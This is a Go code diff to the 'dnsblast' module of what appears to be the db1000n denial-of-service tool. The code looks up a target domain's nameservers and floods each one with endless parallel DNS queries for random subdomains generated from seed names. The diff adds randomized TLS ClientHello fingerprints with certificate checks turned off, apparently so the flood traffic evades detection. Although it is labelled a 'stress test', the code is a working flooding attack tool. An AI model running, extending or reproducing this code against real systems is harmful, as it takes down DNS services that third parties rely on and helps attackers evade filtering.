@@ -3,14 +3,16 @@ package dnsblast
 import (
 	"context"
 	"crypto/tls"
+	"fmt"
 	"log"
 	"net"
+	"strconv"
 	"sync"
 	"time"
 
 	"github.com/Arriven/db1000n/src/utils"
-
 	"github.com/miekg/dns"
+	utls "github.com/refraction-networking/utls"
 )
 
 const (
@@ -30,60 +32,61 @@ type Config struct {
 	ParallelQueries int
 }
 
-type DNSBlaster struct {
-	Config       *Config
-	DHHGenerator *DistinctHeavyHitterGenerator
-	DNSClient    *dns.Client
-}
+type DNSBlaster struct{}
 
 func Start(ctx context.Context, config *Config) error {
 	defer utils.PanicHandler()
 
 	log.Printf("[DNS BLAST] igniting the blaster, parameters to start: "+
-		"[server=%s; proto=%s; seeds=%v; delay=%s; parallelQueries=%d]",
-		config.RootDomain,
-		config.Protocol,
-		config.SeedDomains,
-		config.Delay,
-		config.ParallelQueries,
-	)
+		"[rootDomain=%s; proto=%s; seeds=%v; delay=%s; parallelQueries=%d]",
+		config.RootDomain, config.Protocol, config.SeedDomains, config.Delay, config.ParallelQueries)
 
-	dhhGenerator, err := NewDistinctHeavyHitterGenerator(config.SeedDomains)
+	nameservers, err := getNameservers(config.RootDomain, config.Protocol)
 	if err != nil {
-		return err
+		return fmt.Errorf("failed to resolve nameservers for the root domain [rootDomain=%s]: %s",
+			config.RootDomain, err)
 	}
 
-	blaster := &DNSBlaster{
-		Config:       config,
-		DHHGenerator: dhhGenerator,
-		DNSClient:    newDefaultDNSClient(config.Protocol),
+	log.Printf("[DNS BLAST] nameservers resolved for the root domain [rootDomain=%v]: %v",
+		config.RootDomain, nameservers)
+
+	blaster := NewDNSBlaster()
+
+	stressTestParameters := &StressTestParameters{
+		Delay:           config.Delay,
+		Protocol:        config.Protocol,
+		SeedDomains:     config.SeedDomains,
+		ParallelQueries: config.ParallelQueries,
 	}
 
-	nameservers, _ := getNameservers(config.RootDomain, config.Protocol)
 	for _, nameserver := range nameservers {
-		go blaster.ExecuteStressTest(nameserver, ctx)
+		go func(nameserver string, parameters *StressTestParameters) {
+			defer utils.PanicHandler()
+
+			if err := blaster.ExecuteStressTest(ctx, nameserver, parameters); err != nil {
+				log.Printf("[DNS BLAST] stress test finished with error "+
+					"[nameserver=%s; proto=%s; seeds=%v; delay=%s; parallelQueries=%d]: %s",
+					nameserver, parameters.Protocol, parameters.SeedDomains, parameters.Delay, parameters.ParallelQueries, err)
+				return
+			}
+		}(nameserver, stressTestParameters)
 	}
 
 	return nil
 }
 
-func getNameservers(rootDomain string, protocol string) (res []string, err error) {
-	port := ":53"
-	if protocol == "tcp-tls" {
-		port = ":853"
-	}
-
-	nameservers, err := net.LookupNS(rootDomain)
-	if err != nil {
-		return nil, err
-	}
-	for _, nameserver := range nameservers {
-		res = append(res, nameserver.Host+port)
-	}
-	return res, nil
+func NewDNSBlaster() *DNSBlaster {
+	return &DNSBlaster{}
 }
 
-func (rcv *DNSBlaster) ExecuteStressTest(nameserver string, ctx context.Context) {
+type StressTestParameters struct {
+	Delay           time.Duration
+	ParallelQueries int
+	Protocol        string
+	SeedDomains     []string
+}
+
+func (rcv *DNSBlaster) ExecuteStressTest(ctx context.Context, nameserver string, parameters *StressTestParameters) error {
 	defer utils.PanicHandler()
 
 	var (
@@ -96,13 +99,20 @@ func (rcv *DNSBlaster) ExecuteStressTest(nameserver string, ctx context.Context)
 
 		keepAliveCounter  = 0
 		keepAliveReminder = 256
-		nextLoopTicker    = time.NewTicker(rcv.Config.Delay)
+		nextLoopTicker    = time.NewTicker(parameters.Delay)
 	)
-	defer rcv.DHHGenerator.Cancel()
+	sharedDNSClient := newDefaultDNSClient(parameters.Protocol)
+
+	dhhGenerator, err := NewDistinctHeavyHitterGenerator(parameters.SeedDomains)
+	if err != nil {
+		return fmt.Errorf("failed to bootstrap the distinct heavy hitter generator: %s", err)
+	}
+
+	defer dhhGenerator.Cancel()
 	defer nextLoopTicker.Stop()
 
 blastLoop:
-	for reusableQuery.QName = range rcv.DHHGenerator.Next() {
+	for reusableQuery.QName = range dhhGenerator.Next() {
 		if keepAliveCounter == keepAliveReminder {
 			log.Printf("[DNS BLAST] Still blasting to [server=%s], OK!", reusableQuery.HostAndPort)
 			keepAliveCounter = 0
@@ -118,11 +128,11 @@ blastLoop:
 			// Keep going
 		}
 
-		awaitGroup.Add(rcv.Config.ParallelQueries)
-		for i := 0; i < rcv.Config.ParallelQueries; i++ {
+		awaitGroup.Add(parameters.ParallelQueries)
+		for i := 0; i < parameters.ParallelQueries; i++ {
 			go func() {
 				defer utils.PanicHandler()
-				rcv.SimpleQueryWithNoResponse(reusableQuery)
+				rcv.SimpleQueryWithNoResponse(sharedDNSClient, reusableQuery)
 				awaitGroup.Done()
 			}()
 		}
@@ -136,6 +146,8 @@ blastLoop:
 			continue blastLoop
 		}
 	}
+
+	return nil
 }
 
 type QueryParameters struct {
@@ -150,12 +162,25 @@ type Response struct {
 	Latency time.Duration
 }
 
-func (rcv *DNSBlaster) SimpleQuery(parameters *QueryParameters) *Response {
+func (rcv *DNSBlaster) SimpleQuery(sharedDNSClient *dns.Client, parameters *QueryParameters) *Response {
 	question := new(dns.Msg).
 		SetQuestion(dns.Fqdn(parameters.QName), parameters.QType)
 
-	_, rtt, err := rcv.DNSClient.Exchange(question, parameters.HostAndPort)
+	co, err := sharedDNSClient.Dial(parameters.HostAndPort)
+	if err != nil {
+		return &Response{
+			WithErr: err != nil,
+			Err:     err,
+		}
+	}
 
+	// Upgrade connection to use randomized ClientHello for TCP-TLS connections
+	if sharedDNSClient.Net == TCPTLSProtoName {
+		co.Conn = utls.UClient(co, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)
+	}
+	defer co.Close()
+
+	_, rtt, err := sharedDNSClient.ExchangeWithConn(question, co)
 	return &Response{
 		WithErr: err != nil,
 		Err:     err,
@@ -163,12 +188,26 @@ func (rcv *DNSBlaster) SimpleQuery(parameters *QueryParameters) *Response {
 	}
 }
 
-func (rcv *DNSBlaster) SimpleQueryWithNoResponse(parameters *QueryParameters) {
+func (rcv *DNSBlaster) SimpleQueryWithNoResponse(sharedDNSClient *dns.Client, parameters *QueryParameters) {
 	question := new(dns.Msg).
 		SetQuestion(dns.Fqdn(parameters.QName), parameters.QType)
-	_, _, err := rcv.DNSClient.Exchange(question, parameters.HostAndPort)
+
+	co, err := sharedDNSClient.Dial(parameters.HostAndPort)
 	if err != nil {
-		log.Printf("failed to complete the DNS query: %s", err)
+		log.Printf("[DNS BLAST] failed to dial remote host [host=%s] to do the DNS query: %s",
+			parameters.HostAndPort, err)
+		return
+	}
+	// Upgrade connection to use randomized ClientHello for TCP-TLS connections
+	if sharedDNSClient.Net == TCPTLSProtoName {
+		co.Conn = utls.UClient(co, &utls.Config{InsecureSkipVerify: true}, utls.HelloRandomized)
+	}
+	defer co.Close()
+
+	_, _, err = sharedDNSClient.Exchange(question, parameters.HostAndPort)
+	if err != nil {
+		log.Printf("[DNS BLAST] failed to complete the DNS query: %s", err)
+		return
 	}
 }
 
@@ -180,7 +219,9 @@ const (
 
 func newDefaultDNSClient(proto string) *dns.Client {
 	c := &dns.Client{
-		Dialer:       &net.Dialer{Timeout: dialTimeout},
+		Dialer: &net.Dialer{
+			Timeout: dialTimeout,
+		},
 		DialTimeout:  dialTimeout,
 		WriteTimeout: writeTimeout,
 		ReadTimeout:  readTimeout,
@@ -194,4 +235,22 @@ func newDefaultDNSClient(proto string) *dns.Client {
 	}
 
 	return c
+}
+
+func getNameservers(rootDomain string, protocol string) (res []string, err error) {
+	port := DefaultDNSPort
+	if protocol == TCPTLSProtoName {
+		port = DefaultDNSOverTLSPort
+	}
+
+	nameservers, err := net.LookupNS(rootDomain)
+	if err != nil {
+		return nil, err
+	}
+
+	for _, nameserver := range nameservers {
+		res = append(res, net.JoinHostPort(nameserver.Host, strconv.Itoa(port)))
+	}
+
+	return res, nil
 }
